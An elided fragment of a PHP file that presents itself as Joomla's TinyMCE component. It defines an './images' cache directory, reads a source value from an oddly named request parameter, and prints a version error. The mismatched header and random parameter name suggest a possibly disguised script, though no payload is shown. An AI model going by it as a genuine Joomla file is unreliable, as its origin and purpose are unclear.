...
/**
 * @version		$Id: tiny_mce 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
...
define ('DIRECTORY_CACHE', './images');        // cache directory
...
$scr_request = 'CJQVh';
$src = get_request ($scr_request, '');
if ($src == '' || strlen ($src) <= 3) {
    display_error ('no specified');
}
...
function display_error ($errorString = '') {
    ...
    echo '<br />Tiny_mce version : ' . VERSION . '</pre>';
	    die ();
